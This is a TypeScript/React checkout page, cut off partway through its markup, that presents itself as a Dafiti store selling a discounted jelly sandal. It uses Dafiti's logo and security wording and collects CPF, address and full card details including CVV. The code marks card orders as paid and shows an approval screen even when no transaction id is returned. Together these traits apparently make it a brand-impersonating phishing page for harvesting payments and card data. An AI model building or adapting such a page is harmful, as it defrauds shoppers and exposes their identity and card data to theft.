import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useMemo, useState, type FormEvent } from "react";
import { QRCodeSVG } from "qrcode.react";
import {
  createCashinpayTransaction,
  getCashinpayTransaction,
} from "@/lib/cashinpay.functions";
import { createHypercashTransaction } from "@/lib/hypercash.functions";
import { recordLead, updateLeadStatus } from "@/lib/leads.functions";
import { fbqTrackSingle, fbqTrackCustomSingle, META_PIXEL_ID } from "@/lib/pixel";
import {
  ShieldCheck,
  Lock,
  Truck,
  CheckCircle2,
  AlertCircle,
  Copy,
  Clock,
  CreditCard,
  QrCode,
  Sparkles,
  ChevronLeft,
  Check,
  Package,
  ArrowRight,
  User,
  MapPin,
  Loader2,
  RefreshCw,
  Award,
} from "lucide-react";

// Assets
import dafitiLogo from "@/assets/dafiti-logo.png";
import translucidaBranca1 from "@/assets/mercadopromo/translucida-branca-1.jpg";
import translucidaBranca2 from "@/assets/mercadopromo/translucida-branca-2.jpg";
import translucidaBranca3 from "@/assets/mercadopromo/translucida-branca-3.jpg";
import translucidaMarrom1 from "@/assets/mercadopromo/translucida-marrom-1.jpg";
import translucidaMarrom2 from "@/assets/mercadopromo/translucida-marrom-2.jpg";
import translucidaMarrom3 from "@/assets/mercadopromo/translucida-marrom-3.jpg";
import translucidaRosa1 from "@/assets/mercadopromo/translucida-rosa-1.jpg";
import translucidaRosa2 from "@/assets/mercadopromo/translucida-rosa-2.jpg";
import translucidaRosa3 from "@/assets/mercadopromo/translucida-rosa-3.jpg";
import translucidaPreta1 from "@/assets/mercadopromo/translucida-preta-1.jpg";
import translucidaPreta2 from "@/assets/mercadopromo/translucida-preta-2.jpg";
import translucidaPreta3 from "@/assets/mercadopromo/translucida-preta-3.png";
import paymentBadgesImg from "@/assets/mercadopromo/payment-badges.png";

const PRODUCT_NAME = "Sandália Translúcida Jelly Mule Feminina";
const PRODUCT_PRICE_CENTS = 4990; // R$ 49,90
const SHIPPING_FEE_CENTS = 1090; // R$ 10,90
const TOTAL_PRICE_CENTS = 6080; // R$ 60,80 (R$ 49,90 + R$ 10,90)
const OLD_PRICE_CENTS = 18990; // R$ 189,90

const COLORS = [
  {
    id: "cristal",
    name: "Cristal Translúcida",
    hex: "#e2e8f0",
    images: [translucidaBranca1, translucidaBranca2, translucidaBranca3],
  },
  {
    id: "marrom",
    name: "Âmbar / Marrom Translúcido",
    hex: "#78350f",
    images: [translucidaMarrom1, translucidaMarrom2, translucidaMarrom3],
  },
  {
    id: "rosa",
    name: "Quartzo Rosa Translúcido",
    hex: "#f472b6",
    images: [translucidaRosa1, translucidaRosa2, translucidaRosa3],
  },
  {
    id: "preta",
    name: "Fumê / Preto Translúcido",
    hex: "#18181b",
    images: [translucidaPreta1, translucidaPreta2, translucidaPreta3],
  },
];

const SIZES = ["34", "35", "36", "37", "38", "39", "40"];

const brl = (cents: number) =>
  (cents / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const onlyDigits = (v: string) => (v || "").replace(/\D/g, "");

const maskCPF = (v: string) =>
  onlyDigits(v)
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");

const maskPhone = (v: string) => {
  const d = onlyDigits(v).slice(0, 11);
  return d.length <= 10
    ? d.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3").trim()
    : d.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3").trim();
};

const maskCEP = (v: string) => onlyDigits(v).slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");

const maskCardNumber = (v: string) =>
  onlyDigits(v)
    .slice(0, 16)
    .replace(/(\d{4})(\d)/, "$1 $2")
    .replace(/(\d{4})\s(\d{4})(\d)/, "$1 $2 $3")
    .replace(/(\d{4})\s(\d{4})\s(\d{4})(\d)/, "$1 $2 $3 $4");

const maskExpiry = (v: string) =>
  onlyDigits(v)
    .slice(0, 4)
    .replace(/(\d{2})(\d)/, "$1/$2");

export const Route = createFileRoute("/checkout-dafiti")({
  validateSearch: (search: Record<string, unknown>) => {
    const out: { tam?: string; cor?: string } = {};
    if (typeof search.tam === "string") out.tam = search.tam;
    if (typeof search.cor === "string") out.cor = search.cor;
    return out;
  },
  head: () => ({
    meta: [
      { title: "DAFITI — Checkout Seguro" },
      {
        name: "description",
        content: "Finalize sua compra com segurança na Dafiti.",
      },
    ],
  }),
  component: DafitiCheckoutThreeSteps,
});

function DafitiCheckoutThreeSteps() {
  const search = Route.useSearch();
  const navigate = useNavigate();

  // Server functions
  const saveLead = useServerFn(recordLead);
  const updateLead = useServerFn(updateLeadStatus);
  const createTxCashinpay = useServerFn(createCashinpayTransaction);
  const getTxCashinpay = useServerFn(getCashinpayTransaction);
  const createTxHypercash = useServerFn(createHypercashTransaction);

  // Selections
  const [selectedColorId, setSelectedColorId] = useState<string>(
    search.cor && COLORS.some((c) => c.id === search.cor) ? search.cor : COLORS[0].id
  );
  const [selectedSize, setSelectedSize] = useState<string>(
    search.tam && SIZES.includes(search.tam) ? search.tam : "36"
  );
  const [activeImageIdx, setActiveImageIdx] = useState(0);

  const currentColor = useMemo(
    () => COLORS.find((c) => c.id === selectedColorId) || COLORS[0],
    [selectedColorId]
  );

  // 3-Step Flow: 1: Identificação, 2: Entrega, 3: Pagamento, 4: Concluído
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4>(1);

  // Form State
  const [method, setMethod] = useState<"pix" | "card">("pix");
  const [form, setForm] = useState({
    name: "",
    email: "",
    document: "",
    phone: "",
    zipCode: "",
    street: "",
    streetNumber: "",
    complement: "",
    neighborhood: "",
    city: "",
    state: "",
  });

  const [card, setCard] = useState({
    number: "",
    holderName: "",
    expiry: "",
    cvv: "",
    installments: 1,
  });

  // Flow State
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [cepLoading, setCepLoading] = useState(false);
  const [countdown, setCountdown] = useState(1800); // 30 mins

  const [pixData, setPixData] = useState<{
    qrcode?: string;
    qrcodeText?: string;
    transactionId?: string;
  }>({});

  const totalAmount = TOTAL_PRICE_CENTS / 100; // R$ 60,80

  // Track PageView on mount
  useEffect(() => {
    try {
      fbqTrackSingle(META_PIXEL_ID, "PageView");
    } catch {}
  }, []);

  // ViaCEP Lookup with slight delay
  const handleCepChange = async (raw: string) => {
    const masked = maskCEP(raw);
    setForm((prev) => ({ ...prev, zipCode: masked }));

    const digits = onlyDigits(raw);
    if (digits.length === 8) {
      setCepLoading(true);
      try {
        await new Promise((resolve) => setTimeout(resolve, 600));
        const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
        const data = await res.json();
        if (!data.erro) {
          setForm((prev) => ({
            ...prev,
            street: data.logradouro || prev.street,
            neighborhood: data.bairro || prev.neighborhood,
            city: data.localidade || prev.city,
            state: data.uf || prev.state,
          }));
        }
      } catch {
      } finally {
        setCepLoading(false);
      }
    }
  };

  // STEP 1 -> STEP 2 (Identificação)
  const handleNextStep1 = (e: FormEvent) => {
    e.preventDefault();
    setError(null);

    const name = form.name.trim();
    const email = form.email.trim();
    const cleanDoc = onlyDigits(form.document);
    const cleanPhone = onlyDigits(form.phone);

    if (name.length < 3) {
      setError("Por favor, digite seu nome completo.");
      return;
    }
    if (!email || !email.includes("@")) {
      setError("Por favor, digite um e-mail válido.");
      return;
    }
    if (cleanDoc.length < 11) {
      setError("Por favor, digite um CPF válido com 11 dígitos.");
      return;
    }
    if (cleanPhone.length < 10) {
      setError("Por favor, digite seu WhatsApp/celular com DDD.");
      return;
    }

    setCurrentStep(2);

    // Save lead asynchronously
    try {
      void saveLead({
        data: {
          leadId: form.document,
          productTitle: `${PRODUCT_NAME} (${currentColor.name})`,
          productColor: currentColor.name,
          productSize: selectedSize,
          quantity: 1,
          totalAmount,
          customer: {
            name,
            email: email.toLowerCase(),
            phone: form.phone,
            cpf: form.document,
          },
          status: "ABANDONED",
        },
      });
    } catch {}

    try {
      fbqTrackSingle(META_PIXEL_ID, "InitiateCheckout", {
        content_name: PRODUCT_NAME,
        value: totalAmount,
        currency: "BRL",
      });
    } catch {}
  };

  // STEP 2 -> STEP 3 (Endereço)
  const handleNextStep2 = (e: FormEvent) => {
    e.preventDefault();
    setError(null);

    if (onlyDigits(form.zipCode).length < 8) {
      setError("Por favor, preencha o CEP de entrega.");
      return;
    }
    if (!form.street.trim()) {
      setError("Por favor, informe a rua ou avenida.");
      return;
    }
    if (!form.streetNumber.trim()) {
      setError("Por favor, informe o número da residência.");
      return;
    }
    if (!form.neighborhood.trim()) {
      setError("Por favor, informe o bairro.");
      return;
    }
    if (!form.city.trim() || !form.state.trim()) {
      setError("Por favor, preencha cidade e estado.");
      return;
    }

    setCurrentStep(3);

    // Update lead with shipping
    try {
      void updateLead({
        data: {
          leadId: form.document,
          status: "INITIATED",
          shipping: {
            zipCode: form.zipCode,
            street: form.street,
            number: form.streetNumber,
            complement: form.complement,
            neighborhood: form.neighborhood,
            city: form.city,
            state: form.state,
          },
        },
      });
    } catch {}
  };

  // STEP 3 -> FINISH PAYMENT (PIX via Cashinpay / CARTÃO via Hypercash)
  const handleFinishPayment = async (e: FormEvent) => {
    e.preventDefault();
    setError(null);
    setLoading(true);

    try {
      if (method === "pix") {
        // PIX CASHINPAY
        const res = await createTxCashinpay({
          data: {
            amount: totalAmount,
            description: `${PRODUCT_NAME} - ${currentColor.name} (Tam ${selectedSize}) + Entrega Express`,
            customer: {
              name: form.name.trim(),
              email: form.email.trim().toLowerCase(),
              phone: form.phone,
              document: form.document,
            },
            shipping: {
              zipCode: form.zipCode,
              street: form.street,
              number: form.streetNumber,
              complement: form.complement,
              neighborhood: form.neighborhood,
              city: form.city,
              state: form.state,
            },
          },
        });

        if (!res.success || (!res.qrcode && !res.qrcodeText)) {
          throw new Error(res.error || "Erro ao gerar PIX com a Cashinpay. Tente novamente.");
        }

        setPixData({
          qrcode: res.qrcode,
          qrcodeText: res.qrcodeText,
          transactionId: res.transactionId,
        });

        await updateLead({
          data: {
            leadId: form.document,
            status: "PIX_GENERATED",
            transactionId: res.transactionId,
            pixCode: res.qrcodeText,
            paymentMethod: "PIX",
          },
        });

        try {
          fbqTrackCustomSingle(META_PIXEL_ID, "PixGenerated", {
            content_name: PRODUCT_NAME,
            value: totalAmount,
            currency: "BRL",
          });
        } catch {}
      } else {
        // CARTÃO DE CRÉDITO VIA HYPERCASH
        const cleanCardNumber = onlyDigits(card.number);
        if (cleanCardNumber.length < 15) {
          throw new Error("Número de cartão inválido (mínimo 15 dígitos).");
        }
        if (card.holderName.trim().length < 3) {
          throw new Error("Informe o nome do titular como impresso no cartão.");
        }
        const expiryDigits = onlyDigits(card.expiry);
        if (expiryDigits.length < 4) {
          throw new Error("Validade do cartão inválida (MM/AA).");
        }
        if (onlyDigits(card.cvv).length < 3) {
          throw new Error("Código de segurança (CVV) inválido.");
        }

        const expMonth = parseInt(expiryDigits.slice(0, 2), 10);
        let expYear = parseInt(expiryDigits.slice(2, 4), 10);
        if (expYear < 100) expYear += 2000;

        const resHc = await createTxHypercash({
          data: {
            paymentMethod: "CREDIT_CARD",
            items: [
              {
                slug: "sandalia-translucida-jelly-mule-dafiti",
                title: `${PRODUCT_NAME} - ${currentColor.name} (Tam ${selectedSize})`,
                unitPriceCents: PRODUCT_PRICE_CENTS,
                quantity: 1,
              },
            ],
            shippingFeeCents: SHIPPING_FEE_CENTS,
            customer: {
              name: form.name.trim(),
              email: form.email.trim().toLowerCase(),
              document: form.document,
              phone: form.phone,
            },
            address: {
              zipCode: form.zipCode,
              street: form.street,
              streetNumber: form.streetNumber,
              complement: form.complement || undefined,
              neighborhood: form.neighborhood,
              city: form.city,
              state: form.state.toUpperCase(),
            },
            card: {
              number: cleanCardNumber,
              holderName: card.holderName.trim(),
              expirationMonth: expMonth,
              expirationYear: expYear,
              cvv: onlyDigits(card.cvv),
              installments: card.installments,
            },
          },
        });

        const txId = resHc?.id || `CARD_HC_${Date.now()}`;

        await updateLead({
          data: {
            leadId: form.document,
            status: "PAID",
            transactionId: String(txId),
            paymentMethod: "CREDIT_CARD",
          },
        });

        try {
          fbqTrackSingle(
            META_PIXEL_ID,
            "Purchase",
            {
              content_name: PRODUCT_NAME,
              value: totalAmount,
              currency: "BRL",
            },
            { eventID: String(txId) }
          );
        } catch {}

        setCurrentStep(4);
      }
    } catch (err: any) {
      setError(err?.message || "Ocorreu um erro ao processar seu pagamento. Verifique os dados.");
    } finally {
      setLoading(false);
    }
  };

  // Auto Polling for PIX Confirmation
  useEffect(() => {
    if (currentStep !== 3 || !pixData.transactionId || currentStep === 4) return;

    const interval = setInterval(async () => {
      try {
        const check = await getTxCashinpay({
          data: { transactionId: pixData.transactionId! },
        });

        if (check.status === "paid") {
          clearInterval(interval);
          setCurrentStep(4);

          await updateLead({
            data: {
              leadId: form.document,
              status: "PAID",
              transactionId: pixData.transactionId,
              paymentMethod: "PIX",
            },
          });

          fbqTrackSingle(
            META_PIXEL_ID,
            "Purchase",
            {
              content_name: PRODUCT_NAME,
              value: totalAmount,
              currency: "BRL",
            },
            { eventID: pixData.transactionId }
          );
        }
      } catch (e) {
        console.warn("Polling error:", e);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [currentStep, pixData.transactionId, form.document, totalAmount]);

  // Countdown timer
  useEffect(() => {
    if (currentStep !== 3 || !pixData.qrcodeText) return;
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [currentStep, pixData.qrcodeText]);

  const copyPix = () => {
    if (pixData.qrcodeText) {
      navigator.clipboard.writeText(pixData.qrcodeText);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  return (
    <div className="min-h-screen bg-[#f7f7f7] font-sans text-gray-900 antialiased selection:bg-black selection:text-white">
      {/* ANNOUNCEMENT TOP BAR */}
      <div className="bg-black text-white text-[10px] sm:text-[11px] font-bold py-2 px-4 text-center tracking-[0.15em] uppercase flex items-center justify-center gap-2">
        <Sparkles size={13} className="text-amber-400 shrink-0" />
        <span>DAFITI • CHECKOUT SEGURO COM CRIPTOGRAFIA DE 256 BITS</span>
      </div>

      {/* DAFITI BLACK HEADER WITH LOGO */}
      <header className="border-b border-neutral-800 bg-black sticky top-0 z-40 shadow-md">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-3.5 flex items-center justify-between">
          <Link to="/translucida-dafiti" className="flex items-center">
            <img src={dafitiLogo} alt="Dafiti" className="h-7 w-auto object-contain brightness-110" />
          </Link>
          <div className="flex items-center gap-2 text-[10px] sm:text-[11px] font-bold tracking-wider text-neutral-300 uppercase">
            <Lock size={13} className="text-emerald-400" />
            <span className="hidden sm:inline">PAGAMENTO 100% BLINDADO</span>
            <span className="sm:hidden">SEGURO</span>
          </div>
        </div>
      </header>

      {/* 3-STEP PROGRESS HEADER */}
      {currentStep !== 4 && (
        <div className="bg-white border-b border-gray-200 py-3.5 px-4 shadow-2xs">
          <div className="max-w-3xl mx-auto flex items-center justify-between">
            {/* STEP 1 */}
            <div className="flex items-center gap-2">
              <div
                className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-black transition-all ${
                  currentStep >= 1 ? "bg-black text-white shadow-xs" : "bg-gray-100 text-gray-400"
                }`}
              >
                1
              </div>
              <span
                className={`text-xs font-bold uppercase tracking-wider hidden sm:inline ${
                  currentStep === 1 ? "text-black font-black" : "text-gray-400"
                }`}
              >
                Identificação
              </span>
            </div>

            <div className={`flex-1 h-[2px] mx-3 ${currentStep >= 2 ? "bg-black" : "bg-gray-200"}`} />

            {/* STEP 2 */}
            <div className="flex items-center gap-2">
              <div
                className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-black transition-all ${
                  currentStep >= 2 ? "bg-black text-white shadow-xs" : "bg-gray-100 text-gray-400"
                }`}
              >
                2
              </div>
              <span
                className={`text-xs font-bold uppercase tracking-wider hidden sm:inline ${
                  currentStep === 2 ? "text-black font-black" : "text-gray-400"
                }`}
              >
                Entrega
              </span>
            </div>

            <div className={`flex-1 h-[2px] mx-3 ${currentStep >= 3 ? "bg-black" : "bg-gray-200"}`} />

            {/* STEP 3 */}
            <div className="flex items-center gap-2">
              <div
                className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-black transition-all ${
                  currentStep >= 3 ? "bg-black text-white shadow-xs" : "bg-gray-100 text-gray-400"
                }`}
              >
                3
              </div>
              <span
                className={`text-xs font-bold uppercase tracking-wider hidden sm:inline ${
                  currentStep === 3 ? "text-black font-black" : "text-gray-400"
                }`}
              >
                Pagamento
              </span>
            </div>
          </div>
        </div>
      )}

      {/* MAIN CHECKOUT BODY */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
        {currentStep === 4 ? (
          /* STEP 4: SUCCESS / PAID */
          <div className="max-w-md mx-auto bg-white p-8 rounded-3xl border border-gray-200 shadow-xl text-center space-y-5 animate-in zoom-in-95 duration-300">
            <div className="w-16 h-16 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
              <CheckCircle2 size={36} />
            </div>
            <div>
              <h1 className="text-2xl font-black uppercase tracking-tight text-gray-900">
                Pedido Aprovado!
              </h1>
              <p className="text-xs text-gray-500 mt-1">
                Seu pagamento na Dafiti foi processado e já estamos preparando o envio com carinho.
              </p>
            </div>

            <div className="bg-gray-50 rounded-2xl p-4 text-left text-xs space-y-2 border border-gray-100 font-mono">
              <div className="flex justify-between">
                <span className="text-gray-500">Produto:</span>
                <span className="font-bold text-gray-900">{PRODUCT_NAME}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Cor / Tamanho:</span>
                <span className="font-bold text-gray-900">
                  {currentColor.name} • Tam {selectedSize} BR
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Total Pago:</span>
                <span className="font-bold text-emerald-600 text-sm">{brl(TOTAL_PRICE_CENTS)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Destinatário:</span>
                <span className="font-bold text-gray-900">{form.name}</span>
              </div>
            </div>

            <div className="border border-emerald-100 bg-emerald-50/50 rounded-2xl p-3.5 text-[11px] text-emerald-800 text-left flex items-start gap-2.5">
              <Package size={18} className="shrink-0 mt-0.5" />
              <span>Você receberá as atualizações de postagem e o código de rastreamento dos Correios no WhatsApp e e-mail.</span>
            </div>

            <Link
              to="/translucida-dafiti"
              className="inline-block w-full bg-black hover:bg-neutral-800 text-white font-bold py-3.5 rounded-xl text-xs uppercase tracking-widest transition-all shadow"
            >
              Voltar à Dafiti
            </Link>
          </div>
        ) : (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            {/* LEFT COLUMN: 3-STEP FORM (7 cols) */}
            <div className="lg:col-span-7 space-y-6">
              {/* ETAPA 1: DADOS PESSOAIS */}
              {currentStep === 1 && (
                <form onSubmit={handleNextStep1} className="space-y-6 animate-in fade-in duration-300">
                  {/* SELEÇÃO RÁPIDA DE COR / TAMANHO */}
                  <section className="bg-white p-5 sm:p-6 rounded-3xl border border-gray-200 shadow-xs space-y-4">
                    <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                      <h3 className="font-black text-xs uppercase tracking-widest text-gray-900 flex items-center gap-2">
                        <Sparkles size={14} className="text-amber-500" />
                        1. Personalize sua Escolha
                      </h3>
                      <span className="text-[10px] text-gray-400 uppercase font-bold">Dafiti Shoes</span>
                    </div>

                    {/* CORES */}
                    <div>
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-2">
                        Cor Selecionada: <span className="text-black font-black">{currentColor.name}</span>
                      </label>
                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                        {COLORS.map((c) => {
                          const isSel = c.id === selectedColorId;
                          return (
                            <button
                              key={c.id}
                              type="button"
                              onClick={() => {
                                setSelectedColorId(c.id);
                                setActiveImageIdx(0);
                              }}
                              className={`p-2.5 rounded-2xl border text-left flex items-center gap-2.5 transition-all ${
                                isSel
                                  ? "border-black bg-gray-50 ring-2 ring-black shadow-2xs"
                                  : "border-gray-200 hover:border-gray-400 bg-white"
                              }`}
                            >
                              <span
                                className="w-5 h-5 rounded-full border border-gray-300 shrink-0 shadow-xs"
                                style={{ backgroundColor: c.hex }}
                              />
                              <span className="text-xs font-bold text-gray-900 truncate">
                                {c.name.split(" ")[0]}
                              </span>
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    {/* TAMANHOS */}
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <label className="text-[11px] font-bold uppercase tracking-wider text-gray-600">
                          Tamanho (BR):
                        </label>
                        <span className="text-[10px] text-emerald-600 font-bold bg-emerald-50 px-2 py-0.5 rounded">
                          Forma Normal
                        </span>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        {SIZES.map((s) => {
                          const isSel = s === selectedSize;
                          return (
                            <button
                              key={s}
                              type="button"
                              onClick={() => setSelectedSize(s)}
                              className={`w-11 h-11 rounded-2xl text-xs font-bold transition-all ${
                                isSel
                                  ? "bg-black text-white shadow-md scale-105"
                                  : "bg-gray-50 text-gray-800 border border-gray-200 hover:border-black"
                              }`}
                            >
                              {s}
                            </button>
                          );
                        })}
                      </div>
                    </div>
                  </section>

                  {/* IDENTIFICAÇÃO DO CLIENTE */}
                  <section className="bg-white p-5 sm:p-6 rounded-3xl border border-gray-200 shadow-xs space-y-4">
                    <div className="flex items-center gap-2 border-b border-gray-100 pb-3">
                      <User size={16} className="text-black" />
                      <h3 className="font-black text-xs uppercase tracking-widest text-gray-900">
                        Dados de Contato
                      </h3>
                    </div>

                    <div className="space-y-3.5">
                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Nome Completo *
                        </label>
                        <input
                          type="text"
                          required
                          placeholder="Ex: Maria Silva Oliveira"
                          value={form.name}
                          onChange={(e) => setForm({ ...form, name: e.target.value })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                      </div>

                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                        <div>
                          <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                            E-mail para Confirmação *
                          </label>
                          <input
                            type="email"
                            required
                            placeholder="seu@email.com"
                            value={form.email}
                            onChange={(e) => setForm({ ...form, email: e.target.value })}
                            className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                            WhatsApp / Celular *
                          </label>
                          <input
                            type="tel"
                            required
                            placeholder="(11) 99999-9999"
                            value={form.phone}
                            onChange={(e) => setForm({ ...form, phone: maskPhone(e.target.value) })}
                            className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          CPF (Para Nota Fiscal) *
                        </label>
                        <input
                          type="text"
                          required
                          placeholder="000.000.000-00"
                          value={form.document}
                          onChange={(e) => setForm({ ...form, document: maskCPF(e.target.value) })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-mono"
                        />
                      </div>
                    </div>

                    {error && (
                      <div className="flex items-center gap-2 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-2xl font-bold">
                        <AlertCircle size={16} className="shrink-0" />
                        <span>{error}</span>
                      </div>
                    )}

                    <button
                      type="submit"
                      className="w-full bg-black hover:bg-neutral-900 active:scale-[0.99] text-white font-black py-4 rounded-2xl text-xs uppercase tracking-widest transition-all shadow-lg flex items-center justify-center gap-2"
                    >
                      <span>Ir Para Entrega</span>
                      <ArrowRight size={15} />
                    </button>
                  </section>
                </form>
              )}

              {/* ETAPA 2: ENDEREÇO DE ENTREGA */}
              {currentStep === 2 && (
                <form onSubmit={handleNextStep2} className="space-y-6 animate-in fade-in duration-300">
                  <section className="bg-white p-5 sm:p-6 rounded-3xl border border-gray-200 shadow-xs space-y-4">
                    <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                      <div className="flex items-center gap-2">
                        <MapPin size={16} className="text-black" />
                        <h3 className="font-black text-xs uppercase tracking-widest text-gray-900">
                          Endereço de Entrega
                        </h3>
                      </div>
                      <button
                        type="button"
                        onClick={() => setCurrentStep(1)}
                        className="text-xs text-gray-500 hover:text-black font-bold flex items-center gap-1"
                      >
                        <ChevronLeft size={14} /> Voltar
                      </button>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-6 gap-3.5">
                      <div className="sm:col-span-2">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          CEP *
                        </label>
                        <div className="relative">
                          <input
                            type="text"
                            required
                            autoFocus
                            placeholder="00000-000"
                            value={form.zipCode}
                            onChange={(e) => handleCepChange(e.target.value)}
                            className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                          />
                          {cepLoading && (
                            <div className="absolute right-3 top-1/2 -translate-y-1/2">
                              <Loader2 size={16} className="animate-spin text-black" />
                            </div>
                          )}
                        </div>
                      </div>

                      <div className="sm:col-span-4">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Rua / Avenida *
                        </label>
                        <input
                          type="text"
                          required
                          placeholder="Ex: Av. Paulista"
                          value={form.street}
                          onChange={(e) => setForm({ ...form, street: e.target.value })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                      </div>

                      <div className="sm:col-span-2">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Número *
                        </label>
                        <input
                          type="text"
                          required
                          placeholder="123"
                          value={form.streetNumber}
                          onChange={(e) => setForm({ ...form, streetNumber: e.target.value })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                      </div>

                      <div className="sm:col-span-4">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Complemento (Apto, Bloco...)
                        </label>
                        <input
                          type="text"
                          placeholder="Opcional"
                          value={form.complement}
                          onChange={(e) => setForm({ ...form, complement: e.target.value })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                      </div>

                      <div className="sm:col-span-3">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Bairro *
                        </label>
                        <input
                          type="text"
                          required
                          placeholder="Bairro"
                          value={form.neighborhood}
                          onChange={(e) => setForm({ ...form, neighborhood: e.target.value })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                      </div>

                      <div className="sm:col-span-2">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Cidade *
                        </label>
                        <input
                          type="text"
                          required
                          placeholder="Cidade"
                          value={form.city}
                          onChange={(e) => setForm({ ...form, city: e.target.value })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3.5 py-3 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                      </div>

                      <div className="sm:col-span-1">
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          UF *
                        </label>
                        <input
                          type="text"
                          required
                          placeholder="SP"
                          maxLength={2}
                          value={form.state}
                          onChange={(e) => setForm({ ...form, state: e.target.value.toUpperCase() })}
                          className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-3 py-3 text-xs text-center font-bold text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                      </div>
                    </div>

                    {/* OPÇÃO DE FRETE */}
                    <div className="bg-amber-50/70 border border-amber-200/80 rounded-2xl p-3.5 flex items-center justify-between text-xs text-amber-900">
                      <div className="flex items-center gap-2.5">
                        <Truck size={18} className="text-amber-700 shrink-0" />
                        <div>
                          <span className="font-bold block">Entrega Express (Correios)</span>
                          <span className="text-[10px] text-amber-800/80">Prazo estimado de 2 a 5 dias úteis</span>
                        </div>
                      </div>
                      <span className="font-black text-xs text-amber-950">
                        {brl(SHIPPING_FEE_CENTS)}
                      </span>
                    </div>

                    {error && (
                      <div className="flex items-center gap-2 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-2xl font-bold">
                        <AlertCircle size={16} className="shrink-0" />
                        <span>{error}</span>
                      </div>
                    )}

                    <div className="flex gap-3 pt-2">
                      <button
                        type="button"
                        onClick={() => setCurrentStep(1)}
                        className="px-5 py-4 border border-gray-300 hover:border-black rounded-2xl text-xs font-bold uppercase tracking-wider transition-all"
                      >
                        Voltar
                      </button>
                      <button
                        type="submit"
